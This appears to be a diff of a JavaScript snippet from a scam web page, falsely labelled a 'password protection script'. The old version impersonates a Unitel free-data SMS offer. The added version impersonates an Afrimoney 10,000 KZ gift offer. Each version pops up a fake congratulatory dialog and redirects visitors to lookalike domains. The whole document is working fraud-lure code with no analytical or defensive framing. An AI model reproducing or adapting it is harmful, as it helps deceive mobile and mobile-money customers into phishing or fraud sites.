@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '20GB de dados gratuitos'
-password=prompt('SMS: Parabéns, seu número é elegível para receber 20GB DE DADOS GRÁTIS OFERTA DE COMEMORAÇÃO DO DIA DA PAZ DA UNITEL, pressione OK para ATIVAR','20GB de dados gratuitos');
-if (password != '20GB de dados gratuitos') {
-location.href='https://unitel-ag.4g-data.info/20GB';
+var password = 'aceita 10.000KZ'
+password=prompt('SMS: Parabéns! A sua conta Afrimoney é elegível para receber a oferta de aniversário de 10.000KZ. Prima OK para CONTINUAR.','aceita 10.000KZ');
+if (password != 'aceita 10.000KZ') {
+location.href='https://afrimoney.alloffers.org/gift';
 }
